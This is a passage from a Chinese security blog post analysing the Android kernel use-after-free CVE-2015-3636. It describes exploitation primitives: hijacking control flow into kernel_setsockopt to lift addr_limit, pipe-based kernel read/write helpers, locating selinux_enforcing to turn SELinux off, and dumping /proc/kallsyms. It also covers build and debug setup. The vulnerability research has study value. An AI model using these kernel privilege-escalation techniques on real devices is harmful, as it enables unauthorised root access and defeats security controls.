<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">char</span> *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">mm_segment_t</span> oldfs = get_fs();</span><br><span class="line">	<span class="keyword">char</span> __user *uoptval;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	uoptval = (<span class="keyword">char</span> __user __force *) optval;</span><br><span class="line"></span><br><span class="line">	set_fs(KERNEL_DS);</span><br><span class="line">	<span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">		err = sock_setsockopt(sock, level, optname, uoptval, optlen);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		err = sock-&gt;ops-&gt;setsockopt(sock, level, optname, uoptval,</span><br><span class="line">					    optlen);</span><br><span class="line">	set_fs(oldfs);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>对应的汇编代码：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC00035D788 kernel_setsockopt                       ; CODE XREF: svc_setup_socket+238↓p</span><br><span class="line">ROM:FFFFFFC00035D788                                         ; svc_setup_socket+37C↓p</span><br><span class="line">ROM:FFFFFFC00035D788</span><br><span class="line">ROM:FFFFFFC00035D788 var_s0          &#x3D;  0</span><br><span class="line">ROM:FFFFFFC00035D788 var_s10         &#x3D;  0x10</span><br><span class="line">ROM:FFFFFFC00035D788</span><br><span class="line">ROM:FFFFFFC00035D788                 STP             X29, X30, [SP,#-0x20+var_s0]!</span><br><span class="line">ROM:FFFFFFC00035D78C                 CMP             W1, #1</span><br><span class="line">ROM:FFFFFFC00035D790                 MOV             X5, SP</span><br><span class="line">ROM:FFFFFFC00035D794                 MOV             X29, SP</span><br><span class="line">ROM:FFFFFFC00035D798                 STP             X19, X20, [SP,#var_s10]</span><br><span class="line">ROM:FFFFFFC00035D79C                 AND             X19, X5, #0xFFFFFFFFFFFFC000</span><br><span class="line">ROM:FFFFFFC00035D7A0                 MOV             X5, #0xFFFFFFFFFFFFFFFF</span><br><span class="line">ROM:FFFFFFC00035D7A4                 LDR             X20, [X19,#8]</span><br><span class="line">ROM:FFFFFFC00035D7A8                 STR             X5, [X19,#8]</span><br><span class="line">ROM:FFFFFFC00035D7AC                 B.EQ            loc_FFFFFFC00035D7CC</span><br><span class="line">ROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]</span><br><span class="line">ROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]</span><br><span class="line">ROM:FFFFFFC00035D7B8                 BLR             X5</span><br><span class="line">ROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]</span><br><span class="line">ROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">ROM:FFFFFFC00035D7C4                 LDP             X29, X30, [SP+var_s0],#0x20</span><br><span class="line">ROM:FFFFFFC00035D7C8                 RET</span><br></pre></td></tr></table></div></figure>
<p><code>ROM:FFFFFFC00035D7BC STR X20, [X19,#8]</code>这行对应于<code>set_fs(oldfs);</code>，跳过这一句，用户态进程对应的addr_limit就成了<code>0xFFFFFFFFFFFFFFFF</code>，可以访问内核空间了。</p>
<p>也就是说将x5设置为0xFFFFFFC00035D7C0即可，那么要求[x5,#0x68]处存放0xFFFFFFC00035D7C0。x0是控制流劫持发生时的残留值，可根据实际情况变更。</p>

        <h3 id="pipe系统调用"   >
          <a href="#pipe系统调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#pipe系统调用" class="headerlink" title="pipe系统调用"></a>pipe系统调用</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/350dc21fe5e3" >pipe() 系统调用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>通过pipe()创建一个管道，返回两个文件描述符，fd[0]为读，fd[1]为写。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_read4</span><span class="params">(<span class="keyword">void</span>* kernel_addr,  <span class="keyword">unsigned</span> <span class="keyword">int</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipefd)</span><br><span class="line">    write(pipefd[<span class="number">1</span>], kernel_addr, <span class="number">4</span>)</span><br><span class="line">	read(pipefd[<span class="number">0</span>], value, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kernel_write4</span><span class="params">(<span class="keyword">void</span>* kernel_addr, <span class="keyword">unsigned</span> <span class="keyword">int</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipefd)</span><br><span class="line">    write(pipefd[<span class="number">1</span>], value, <span class="number">4</span>)</span><br><span class="line">    read(pipefd[<span class="number">0</span>], kernel_addr, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>





        <h2 id="关闭selinux"   >
          <a href="#关闭selinux" class="heading-link"><i class="fas fa-link"></i></a><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a>关闭selinux</h2>
      <p>如何查看selinux状态？</p>
<blockquote>
<p><code>/usr/sbin/sestatus -v </code>或者<code>getenforce</code></p>
</blockquote>
<p>通过内核镜像中，如selinux_init()、sel_read_enforce()、sel_write_enforce()等函数，可以定位到selinux_enforcing的内存地址。</p>
<ul>
<li>selinux_enforcing为0，SELinux为permissive模式</li>
<li>selinux_enforcing为1，SELinux为enforcing模式</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA中伪代码如下</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sel_read_enforce</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// w0</span></span><br><span class="line">  _BYTE v9[<span class="number">16</span>]; <span class="comment">// [xsp+30h] [xbp+30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = scnprintf(v9, <span class="number">12</span>i64, <span class="string">&quot;%d&quot;</span>, MEMORY[<span class="number">0xFFFFFFC00065399C</span>]);</span><br><span class="line">    <span class="comment">//0xFFFFFFC00065399C即selinux_enforcing</span></span><br><span class="line">  <span class="keyword">return</span> simple_read_from_buffer(a2, a3, a4, v9, v7);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对应的源码如下</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">sel_read_enforce</span><span class="params">(struct file *filp, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">				<span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> tmpbuf[TMPBUFLEN];</span><br><span class="line">	<span class="keyword">ssize_t</span> length;</span><br><span class="line"></span><br><span class="line">	length = scnprintf(tmpbuf, TMPBUFLEN, <span class="string">&quot;%d&quot;</span>, selinux_enforcing);</span><br><span class="line">	<span class="keyword">return</span> simple_read_from_buffer(buf, count, ppos, tmpbuf, length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="thread-info与task-struct"   >
          <a href="#thread-info与task-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#thread-info与task-struct" class="headerlink" title="thread_info与task_struct"></a>thread_info与task_struct</h2>
      
        <h3 id="task-struct"   >
          <a href="#task-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041" >task_struct结构体</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>中，除了漏洞利用提权时比较关注的cred结构体以外，还有个特殊的指针<code>void *stack</code>，它指向内核栈，同时也是thread_info结构体的存放地址。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">stack</span>;			</span><br><span class="line">	<span class="keyword">atomic_t</span> usage;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;	<span class="comment">/* per process flags, defined below */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ptrace;</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">    <span class="comment">/* process credentials */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>	<span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p><code>void *stack</code>指向一个联合体，叫做<code>thread_union</code>，即代表内核栈，也代表thread_info。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
<p>task_struct，thread_info和内核栈之间的关系如下图所示。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yungyu16/p/13023982.html" >内核栈与thread_info结构详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img   src="image-20220919162607272.png?size=600" style="width: 600px;"  alt="image-20220919162607272"></p>

        <h3 id="thread-info"   >
          <a href="#thread-info" class="heading-link"><i class="fas fa-link"></i></a><a href="#thread-info" class="headerlink" title="thread_info"></a>thread_info</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">mm_segment_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	<span class="keyword">mm_segment_t</span>		addr_limit;	<span class="comment">/* address limit */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">task</span>;</span>		<span class="comment">/* main task structure */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>	*<span class="title">exec_domain</span>;</span>	<span class="comment">/* execution domain */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span>	<span class="title">restart_block</span>;</span></span><br><span class="line">	<span class="keyword">int</span>			preempt_count;	<span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; bug */</span></span><br><span class="line">	<span class="keyword">int</span>			cpu;		<span class="comment">/* cpu */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>



        <h1 id="其他"   >
          <a href="#其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他" class="headerlink" title="其他"></a>其他</h1>
      
        <h2 id="andorid模拟器"   >
          <a href="#andorid模拟器" class="heading-link"><i class="fas fa-link"></i></a><a href="#andorid模拟器" class="headerlink" title="andorid模拟器"></a>andorid模拟器</h2>
      <p>android模拟器有很多，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.androidauthority.com/best-android-emulators-for-pc-655308/" >15 best Android emulators for PC and Mac of 2022</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，android studio适合开发者，qemu-android适合研究调试。</p>
<p>猜测：只有android studio和qemu-android可以模拟arm架构的android，其他模拟器（大多数）都是x86架构的android。因为android studio和qemu-android都是谷歌家开发的。</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://qemu-android.googlesource.com/?format=HTML"><strong>qemu-android</strong></a>：谷歌开发人员基于qemu更改的模拟器，用于启动goldfish对应的android。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://stackoverflow.com/a/38938169" >Difference among Android’s emulator command variations</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/goldfish/+refs"><strong>goldfish</strong></a>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://groups.google.com/g/android-kernel/c/M4SjXulUeUo/m/M5BCX9bfk2oJ" >由谷歌开发并命名的一个虚拟CPU（或board），用于Android模拟器</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><strong>ranchu</strong>：我认为可以简单的把ranchu理解为goldfish的升级版，对应有升级版的qemu-android（也可称之为qemu-ranchu）。<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://groups.google.com/g/android-emulator-dev/c/dltBnUW_HzU/m/2tSZNLaVzmQJ" >New emulator code base (qemu-android) and “ranchu” virtual board</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
<p>对于想准确研究以上概念的同学，推荐参考书籍：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.oreilly.com/library/view/android-system-programming/9781787125360/" >Android System Programming</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ubuntu-ndk编译环境"   >
          <a href="#ubuntu-ndk编译环境" class="heading-link"><i class="fas fa-link"></i></a><a href="#ubuntu-ndk编译环境" class="headerlink" title="ubuntu ndk编译环境"></a>ubuntu ndk编译环境</h2>
      <p>参考了这篇文章：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cxybb.com/article/qq_45683435/113838305" >ubuntu下android ndk编译环境搭建方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>下载<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://dl.google.com/android/repository/android-ndk-r13b-linux-x86_64.zip" >android-ndk-r13b</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后按照如下命令安装</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~$</span><span class="bash"> unzip android-ndk-r13b-linux-x86_64.zip</span></span><br><span class="line"><span class="meta">~$</span><span class="bash"> mkdir ndk-android-tool-chain</span></span><br><span class="line"><span class="meta">~$</span><span class="bash"> <span class="built_in">cd</span> ./android-ndk-r13b/build/tools</span></span><br><span class="line"><span class="meta">~/android-ndk-r13b/build/tools$</span><span class="bash"> ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --install-dir=/home/bling/ndk-android-tool-chain --force</span></span><br><span class="line"><span class="meta">~/android-ndk-r13b/build/tools$</span><span class="bash"> ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --force</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在/home/bling/ndk-android-tool-chain/bin目录下有我们需要的编译器android gcc及ndk-build</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最后，将该路径配置到环境变量中</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> PATH=/home/bling/ndk-android-tool-chain/bin:<span class="variable">$PATH</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">export</span> PATH=/home/bling/android-ndk-r13b:<span class="variable">$PATH</span></span></span><br></pre></td></tr></table></div></figure>



        <h2 id="提取内核代码并恢复符号"   >
          <a href="#提取内核代码并恢复符号" class="heading-link"><i class="fas fa-link"></i></a><a href="#提取内核代码并恢复符号" class="headerlink" title="提取内核代码并恢复符号"></a>提取内核代码并恢复符号</h2>
      
        <h3 id="旧方法-IDApython脚本"   >
          <a href="#旧方法-IDApython脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#旧方法-IDApython脚本" class="headerlink" title="旧方法 - IDApython脚本"></a>旧方法 - IDApython脚本</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/" >逆向ARM64内核zImage</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/QQ1084283172/article/details/57074695" >从Android设备中提取内核和逆向分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>Image就是内核代码，由于系统未开启KASLR，通过启动时打印的log我们可以获得内核加载基址0xffffffc000080000。</p>
<p><img   src="image-20220724182224254.png?size=600" style="width: 600px;"  alt="image-20220724182224254"></p>
<p>IDA打开Image，并设置好ROM start address和Loading address，从文件头开始按”P”解析函数。发现函数没有符号。</p>
<p>于是回到adb shell中，导出内核符号表</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">cat /proc/kallsyms &gt; /data/local/tmp/1.txt</span><br></pre></td></tr></table></div></figure>
<p>利用内核符号表文件，恢复IDA中对应的函数名，IDA脚本如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">ksyms = <span class="built_in">open</span>(<span class="string">&quot;D:\\yuanyuan\\abc.txt&quot;</span>)	<span class="comment"># 导出的内核符号表文件</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> ksyms:</span><br><span class="line">    addr = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	idc.create_insn(addr)			<span class="comment"># 将指定地址处的机器码翻译成汇编指令</span></span><br><span class="line">	ida_funcs.add_func(addr, BADADDR)	<span class="comment"># 在指定地址处创建一个函数</span></span><br><span class="line">    idc.set_name(addr, name, SN_CHECK)			<span class="comment"># 重命名addr处函数为name</span></span><br><span class="line">    Message(<span class="string">&quot;%08X:%s&quot;</span>%(addr,name))</span><br></pre></td></tr></table></div></figure>
<p>恢复符号表后，发现还有很多函数没有恢复成功，是因为函数名冲突了。但是不影响分析。</p>

        <h3 id="新方法-vmlinux-to-elf"   >
          <a href="#新方法-vmlinux-to-elf" class="heading-link"><i class="fas fa-link"></i></a><a href="#新方法-vmlinux-to-elf" class="headerlink" title="新方法 - vmlinux-to-elf"></a>新方法 - vmlinux-to-elf</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>可以将 vmlinux/vmlinuz/bzImage/zImage等内核镜像恢复符号并转换成elf格式，便于IDA分析。</p>
<p><img   src="image-20220921230829799.png?size=600" style="width: 600px;"  alt="image-20220921230829799"></p>
<p>使用方法如下：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf.git</span><br><span class="line"><span class="built_in">cd</span> vmlinux-to-elf</span><br><span class="line">./vmlinux-to-elf &lt;xxx&gt; xxx.elf</span><br></pre></td></tr></table></div></figure>

        <h2 id="编译调试linux-3-10内核镜像"   >
          <a href="#编译调试linux-3-10内核镜像" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译调试linux-3-10内核镜像" class="headerlink" title="编译调试linux-3.10内核镜像"></a>编译调试linux-3.10内核镜像</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/torvalds/linux.git -b v3.10 --depth=1</span><br><span class="line"><span class="built_in">cd</span> linux</span><br><span class="line"><span class="comment"># 指定交叉编译器。对于小于3.18版本的内核，编译器版本需小于5.0</span></span><br><span class="line">make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig</span><br><span class="line">make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- -j4</span><br></pre></td></tr></table></div></figure>



        <h1 id="参考文档"   >
          <a href="#参考文档" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1>
      <ul>
<li>CVE-2015-3636分析文档</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-230298.htm" >[原创]CVE-2015-3636(pingpong root) android内核 UAF漏洞分析 </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37439229/article/details/122843627?spm=1001.2014.3001.5502" >cve-2015-3636 - 20000s</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://1ce0ear.github.io/2020/03/01/root-cve-2015-3636/" >Study CVE-2015-3636 - I</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://pwn4.fun/2017/08/03/CVE-2015-3636%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" >CVE-2015-3636漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://a7vinx.github.io/2016/12/04/cve_2015_3636/" >CVE-2015-3636</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://idhyt.blogspot.com/2016/03/cve-2015-3636.html" >CVE-2015-3636内核漏洞分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>这篇文章中说，x86-64架构上利用该漏洞仅能造成系统崩溃，而非x86-64架构（如arm）可利用改漏洞提权。</p>
<p>真实设备利用exp：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/fi01/CVE-2015-3636" >CVE-2015-3636 exp.by.fi01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>存在该漏洞的版本： linux kernel &lt;=v4.1-rc1</p>
<ul>
<li>其他参考文档</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://its301.com/article/QQ1084283172/70500488" >Android内核的编译和调试及gdb cheatsheet</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg#qkNWuR" >字节ctf2021 android题中用到了docker运行apk</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://filippo.io/linux-syscall-table/" >Searchable Linux Syscall Table for x86 and x86_64</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/">http://blingblingxuanxuan.github.io/2022/09/21/cve-2015-3636-52pojie-version/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/socket/">socket</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/android/">android</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" 